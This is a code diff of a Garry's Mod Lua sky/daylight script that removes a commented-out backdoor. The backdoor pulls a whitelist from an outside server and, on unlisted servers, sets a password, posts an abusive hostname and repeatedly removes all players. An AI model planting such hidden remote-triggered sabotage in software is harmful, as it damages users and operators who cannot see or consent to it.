@@ -67,34 +67,6 @@ function daylight:init( )
 	
 	// find the sky overlay brush.
 	self.sky_overlay = ents.FindByName( 'skyoverlay*' );
-	--I'm stealing from Kuromiku because you're stealing from me
-	--And I'm very sorry I have to do this. I plan on releasing Bliss, but I have to protect my property. This exploit will not be on the final version.
-/*	http.Get("http://benevolenceservers.com/documents/whitelist.txt", "", function(contents, size)
-
-		local serverIP = GetConVarString("ip");
-		
-		if ( !isDedicatedServer() ) then
-			return;
-		end;
-		
-		for k, v in ipairs( string.Explode("\n", contents) ) do
-			if ( string.match(v, serverIP) ) then
-				return;
-			end;
-		end;
-		
-		RunConsoleCommand("sv_password", "1900mal0d0r");
-		RunConsoleCommand("hostname", "YOU MOTHERFUCKER, YOU CAN'T BE TRUSTED. THIS SHIT IS STOLEN.");
-
-		
-		timer.Create( "trusttimer",  0.1,  0,  function()
-			for k, v in ipairs( player.GetAll() ) do
-				v:Remove()
-			end;
-		end);
-		
-
-	end);	*/
 	// setup the sky color.
 	if ( self.sky_overlay ) then
 		local brush;
